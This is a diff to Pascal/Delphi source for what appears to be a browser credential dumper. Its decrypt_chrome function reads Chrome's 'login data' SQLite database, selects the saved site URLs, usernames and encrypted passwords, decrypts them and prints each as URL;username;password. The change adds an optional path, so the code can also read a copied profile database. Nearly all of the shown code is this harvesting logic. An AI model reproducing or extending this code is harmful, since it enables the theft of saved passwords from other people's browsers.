@@ -15,7 +15,7 @@ uses
   shlobj,
   ucryptoapi,utils;
 
-function decrypt_chrome:boolean;
+function decrypt_chrome(db:string=''):boolean;
 
 implementation
 
@@ -35,7 +35,7 @@ begin
     end;
 end;
 
-function decrypt_chrome:boolean;
+function decrypt_chrome(db:string=''):boolean;
 var
 Props: TSQLDBSQLite3ConnectionProperties ;
   //
@@ -48,8 +48,14 @@ Props: TSQLDBSQLite3ConnectionProperties ;
 begin
   result:=false;
 //C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default
-path:=(GetSpecialFolder($1c));  //CSIDL_LOCAL_APPDATA
-path:=path+'\Google\Chrome\User Data\Default';
+if db='' then
+   begin
+   path:=(GetSpecialFolder($1c));  //CSIDL_LOCAL_APPDATA
+   path:=path+'\Google\Chrome\User Data\Default';
+   end;
+
+if db<>'' then path:= (db);
+writeln('path:'+path);
 
   if not FileExists(path+'\login data') then
   begin
@@ -66,15 +72,16 @@ path:=path+'\Google\Chrome\User Data\Default';
     sqlite3 := TSQLite3LibraryDynamic.Create(SQLITE_LIBRARY_DEFAULT_NAME);
     {$endif}
     //
+    writeln('db:'+path+'\login data.db');
     props:=TSQLDBSQLite3ConnectionProperties.Create(pchar(path+'\login data.db'),'','','');
 
     setlength(b,230);
     try
     rows:= props.Execute('SELECT origin_url,username_value,password_value,length(password_value) from logins',[]);
     result:=true;
+
     while rows.step do
       begin
-
       tmp:=''; //for i:=0 to length(b)-1 do b[i]:=0;
       b:=rows.ColumnBlobBytes('password_value');
       //CryptUnprotect(b,tmp);
@@ -88,8 +95,8 @@ path:=path+'\Google\Chrome\User Data\Default';
          writeln(BytetoAnsiString(output));
          }
          writeln(rows['origin_url']+';'+rows['username_value']+';'+BytetoAnsiString(output));
-         end;
-         end;
+         end; //if length(output)<255 then
+         end else writeln(rows['origin_url']+';'+rows['username_value']+';'+'SCRAMBLED');
       end;
     finally
       //rows._Release ;
